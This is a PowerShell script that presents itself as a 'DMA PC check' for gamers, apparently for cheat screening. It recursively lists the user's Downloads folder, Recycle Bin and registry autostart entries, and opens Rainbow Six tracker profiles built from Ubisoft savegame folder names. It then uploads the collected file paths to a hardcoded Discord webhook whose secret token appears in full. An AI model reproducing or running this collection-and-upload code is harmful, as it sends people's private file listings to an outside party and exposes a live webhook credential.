# Set PowerShell console colors
$X0 = $Host.UI.RawUI
$X0.BackgroundColor = 'Black'
$X0.ForegroundColor = 'Red'
Clear-Host

# ASCII Banner
Write-Host @'
██████╗ ███╗   ███╗ █████╗     ██████╗ ██╗   ██╗██████╗ ██████╗  █████╗ 
██╔══██╗████╗ ████║██╔══██╗    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗
██║  ██║██╔████╔██║███████║    ██████╔╝██║   ██║██████╔╝██████╔╝███████║
██║  ██║██║╚██╔╝██║██╔══██║    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██║
██████╔╝██║ ╚═╝ ██║██║  ██║    ██████╔╝╚██████╔╝██████╔╝██████╔╝██║  ██║
╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝

 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
██║     ███████║█████╗  ██║     █████╔╝ 
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝

      Made by Aqzuko — the man who solely came up with the idea of a PowerShell PC check.
'@

# Progress Messages
Start-Sleep -Milliseconds 400; Write-Host "MojoJojo encryption bypassed..."
Start-Sleep -Milliseconds 600; Write-Host "Fent Reactors Activated"
Start-Sleep -Milliseconds 600; Write-Host "Ratted by Reapiin..."
Start-Sleep -Milliseconds 600; Write-Host "Powered by Klarlandia Tech..."
Start-Sleep -Milliseconds 600; Write-Host "Checking for DMA traces..."
Start-Sleep -Milliseconds 600; Write-Host "Thanks for the cookies..."
Start-Sleep -Milliseconds 600; Write-Host "Establishing DMA uplink..."
Start-Sleep -Milliseconds 600; Write-Host "Bypassing firewall..."
Start-Sleep -Milliseconds 600; Write-Host "Verifying MojoJojo Tech..."
Start-Sleep -Milliseconds 600; Write-Host "GeorgeDroid.api in the main frame..."
Start-Sleep -Milliseconds 600; Write-Host "Reapiin is ChatGPT made."

# Add Clipboard Support
Add-Type -AssemblyName System.Windows.Forms

# Initialize results array
$Z = @()

# Downloads folder scan
$DL = "$env:USERPROFILE\Downloads"
$Z += "`n--- Downloads folder files ---`n"
if (Test-Path $DL) {
    Get-ChildItem -Path $DL -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $Z += "Found: $($_.FullName)"
    }
} else {
    $Z += "Downloads folder not found."
}

# Recycle Bin scan
$Z += "`n--- Recycle Bin ---`n"
$sh = New-Object -ComObject ("Shell.Application")
$rb = $sh.Namespace(0xa)
if ($rb.Items().Count -gt 0) {
    $rb.Items() | ForEach-Object {
        $Z += "Deleted File: $($_.Path)"
    }
} else {
    $Z += "Recycle Bin is empty."
}

# Registry scan for .exe autostarts
$Z += "`n--- Registry EXE references ---`n"
$paths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($path in $paths) {
    $Z += "`n> $path"
    if (Test-Path $path) {
        Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | ForEach-Object {
                if ($_.Value -match "\.exe") {
                    $Z += "$($_.Name): $($_.Value)"
                }
            }
        }
    } else {
        $Z += "Path not found."
    }
}

# Copy result to clipboard
[System.Windows.Forms.Clipboard]::SetText($Z -join "`r`n")
Write-Host "`nScan complete. Results copied to clipboard." -ForegroundColor Green

# Ubisoft folder scan and link open
$ubisoftPath = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\savegames"
if (Test-Path $ubisoftPath) {
    Write-Host "Found Ubisoft savegames folder. Retrieving folder names..."
    $savegameFolders = Get-ChildItem -Path $ubisoftPath -Directory | Select-Object -ExpandProperty Name
    foreach ($folderName in $savegameFolders) {
        $url = "https://r6.tracker.network/r6siege/profile/ubi/$folderName"
        Write-Host "Opening $url"
        Start-Process $url
    }
    Write-Host "Ubisoft profile links opened in browser."
} else {
    Write-Host "Ubisoft savegames folder not found."
}

# Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"

# Save scan results to text file
$txtFile = "$env:TEMP\scan_results.txt"
$scanContent = $Z -join "`r`n"
[System.IO.File]::WriteAllText($txtFile, $scanContent, [System.Text.Encoding]::UTF8)

# Send to Discord webhook
try {
    Write-Host "Sending scan results to Discord..." -ForegroundColor Yellow
    
    # Use PowerShell's native multipart form method
    Write-Host "Using PowerShell multipart form method..." -ForegroundColor Cyan
    
    # Create boundary
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    # Create embed JSON
    $embedJson = @{
        embeds = @(
            @{
                title = "Scan Results"
                color = 65280
            }
        )
    } | ConvertTo-Json -Depth 10 -Compress
    
    # Read file content
    $fileContent = [System.IO.File]::ReadAllText($txtFile, [System.Text.Encoding]::UTF8)
    
    # Build multipart body
    $bodyLines = @(
        "--$boundary",
        'Content-Disposition: form-data; name="payload_json"',
        'Content-Type: application/json',
        '',
        $embedJson,
        "--$boundary",
        'Content-Disposition: form-data; name="file"; filename="scan_results.txt"',
        'Content-Type: text/plain',
        '',
        $fileContent,
        "--$boundary--"
    )
    
    $body = $bodyLines -join $LF
    
    # Send request
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
    Write-Host "Successfully sent scan results with file attachment!" -ForegroundColor Green
    
} catch {
    Write-Host "Multipart form failed, trying embed fallback..." -ForegroundColor Yellow
    
    try {
        # Fallback: Send as embed content (truncated if needed)
        $maxLength = 1900
        $description = if ($scanContent.Length -gt $maxLength) {
            $scanContent.Substring(0, $maxLength) + "`n... (truncated - full results copied to clipboard)"
        } else {
            $scanContent
        }
        
        $payload = @{
            embeds = @(
                @{
                    title = "Scan Results"
                    description = "``````$description``````"
                    color = 65280
                }
            )
        } | ConvertTo-Json -Depth 10
        
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
        Write-Host "Successfully sent scan results in embed!" -ForegroundColor Green
        
    } catch {
        Write-Host "Failed to send to Discord webhook: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Clean up temp file
if (Test-Path $txtFile) {
    Remove-Item $txtFile -ErrorAction SilentlyContinue
    Write-Host "Cleaned up temporary file." -ForegroundColor Gray
}

Write-Host "`nScript execution completed." -ForegroundColor Magenta
